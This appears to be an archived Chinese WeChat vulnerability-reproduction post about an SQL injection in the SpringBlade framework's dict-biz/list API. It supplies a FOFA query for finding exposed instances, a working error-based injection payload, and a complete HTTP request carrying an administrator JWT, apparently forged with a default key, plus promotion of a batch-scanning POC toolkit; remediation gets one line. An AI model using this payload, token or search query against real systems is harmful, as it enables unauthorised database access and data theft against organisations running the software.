---
source: "gelusus/wxvl 公众号漏洞文库"
---

#  SpringBlade dict-biz/list接口存在SQL注入漏洞   
南风徐来  南风漏洞复现文库   2024-04-19 23:19  
  
免责声明：  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。  
该文章仅供学习用途使用。  
## 1. SpringBlade简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
SpringBlade 是一个由商业级项目升级优化而来的微服务架构 采用Spring Boot 2.5 、Spring Cloud 2020 等核心技术构建，完全遵循阿里巴巴编码规范。  
## 2.漏洞描述  
  
SpringBlade 是一个由商业级项目升级优化而来的微服务架构 采用Spring Boot 2.7 、Spring Cloud 2021 等核心技术 构建，完全遵循阿里巴巴编码规范。提供基于React和Vue的两个前端框架用于快速搭建企业级的SaaS多租户微服务平台。SpringBlade list接口存在SQL注入漏洞。  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
SpringBlade  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aTsJRrEsWevJ33FzOEpe5H9micUvdCic9Apoib2pMlx5A570O6BwVsCgI2ARiacyOMJSiauxTGAfiaM8zg/640?wx_fmt=jpeg&from=appmsg "null")  
  
SpringBlade list接口存在SQL注入漏洞  
## 4.fofa查询语句  
  
body="https://bladex.vip"||body="Saber 将不能正常工作"  
## 5.漏洞复现  
  
漏洞链接：https://127.0.0.1/api/blade-system/dict-biz/list?updatexml(1,concat(0x7e,md5(1),0x7e),1)=1  
  
漏洞数据包：  
```
GET /api/blade-system/dict-biz/list?updatexml(1,concat(0x7e,md5(1),0x7e),1)=1 HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Host: 127.0.0.1
Blade-Auth: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJpc3MiOiJpc3N1c2VyIiwiYXVkIjoiYXVkaWVuY2UiLCJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwidXNlcl9pZCI6IjExMjM1OTg4MjE3Mzg2NzUyMDEiLCJyb2xlX2lkIjoiMTEyMzU5ODgxNjczODY3NTIwMSIsInVzZXJfbmFtZSI6ImFkbWluIiwib2F1dGhfaWQiOiIiLCJ0b2tlbl90eXBlIjoiYWNjZXNzX3Rva2VuIiwiZGVwdF9pZCI6IjExMjM1OTg4MTM3Mzg2NzUyMDEiLCJhY2NvdW50IjoiYWRtaW4iLCJjbGllbnRfaWQiOiJzd29yZCIsImV4cCI6MTc5MTU3MzkyMiwibmJmIjoxNjkxNTcwMzIyfQ.wxB9etQp2DUL5d3-VkChwDCV3Kp-qxjvhIF_aD_beF_KLwUHV7ROuQeroayRCPWgOcmjsOVq6FWdvvyhlz9j7A
Accept-Language: zh-CN,zh;q=0.9
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aTsJRrEsWevJ33FzOEpe5HJldgglN91l2bX1ruXSQj5ZjMuTu4aZDIOT8n48ya2PvreHPGVgUkrQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aTsJRrEsWevJ33FzOEpe5HZ7oYiaAmPnrdyfbR3IbFckcI2KVRBSZbzvPENreFbnZrSA0MtgzjoEA/640?wx_fmt=jpeg&from=appmsg "null")  
## 6.POC&EXP  
  
关注公众号 南风漏洞复现文库 并回复 漏洞复现126 即可获得该POC工具下载地址：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aTsJRrEsWevJ33FzOEpe5Hmv19yEKXibja1SMib99JNJWEuKBfFiaWNTh1T3FXrQoW6ycmekAMYy4Yw/640?wx_fmt=jpeg&from=appmsg "null")  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。2: 免登录，免费fofa查询。3: 更新其他实用网络安全工具项目。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aTsJRrEsWevJ33FzOEpe5HCavndDvfAWY9YIfOhxHctxmyuibLIAmgpK4yUq4L4R2cSUfz7gvWIibg/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aTsJRrEsWevJ33FzOEpe5H52MwI9fIFDcCKXhAcibG39Q7za4x3K5H7LQ7iaEQGgEhrWkaDY1QCuSw/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aTsJRrEsWevJ33FzOEpe5HmHUhvuMt1zibhqiaUeBKM3RCNj75TMncKcJYFBDhZiac9jj6nQyhrFy7A/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aTsJRrEsWevJ33FzOEpe5HliaudnrpGIOgBKoCeU80MyB6M1ib2KZpM2iaztiaHHybgQvbG9a94tlVMg/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aTsJRrEsWevJ33FzOEpe5HTGVINIQ7BibgcS1C297DSDKhQQhj3rB0bWZsuZe4vtoCxzF1N7DM1oA/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
⼚商已发布了漏洞修复程序 请及时关注更新：https://github.com/chillzhuang/blade-tool  
## 8.往期回顾  
  
[用友NC Cloud doPost接口存在任意文件上传漏洞2](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247486235&idx=1&sn=797e70d49305df0d175e890a846fa980&chksm=974b861ca03c0f0a18fafe8c60be12bd3e94f2e20627a6bf41b0781c159183934cdb80b2f0ef&scene=21#wechat_redirect)  
  
  
[泛微e-office系统ajax.php接口存在任意文件上传漏洞](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247486198&idx=1&sn=971121723b24414642a6efd672c22ecc&chksm=974b87f1a03c0ee7675fb34a06913c10ca977fd6f9a1158a1bd19af1641fe16ffb2d6ec86e65&scene=21#wechat_redirect)  
  
  
  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
